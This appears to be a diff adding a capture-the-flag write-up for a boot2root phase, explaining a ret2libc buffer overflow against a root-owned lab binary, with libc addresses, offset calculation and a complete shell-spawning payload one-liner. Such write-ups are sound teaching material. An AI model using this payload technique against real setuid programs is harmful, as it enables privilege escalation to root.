@@ -1,0 +1,20 @@
+PHASE 4 ZAZ SSH
+
+In zaz home, there is a file named exploit_me (owned by root) and a dir named mail.
+We will focus on exploiting the binary.
+In gdb, we see that the binary uses strcpy to copy our input into an unprotected buffer.
+We will do a buffer overflow followed by a ret2libc attack.
+Address of system:      0xb7e6b060
+Address of exit:        0xb7e5ebe0
+Adress of "/bin/sh":    0xb7f8cc58
+ESP:                    0xbffff6b0
+EIP:                    0xbffff73c
+To find length of buffer that strcpy copies the input to, we simply do:
+ADDRESS OF EIP - ADDRESS OF ESP
+0xbffff73c - 0xbffff6b0 = 140
+Len of buffer is 140.
+For our attack to be successfull, we need to overwrite EIP's address with the one of system, then we need to write the address of exit and finally the address of "/bin/sh".
+Our attack will have the following form:
+./exploit_me $(python -c 'print "a"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
+
+See extended walkthrough for additional information.
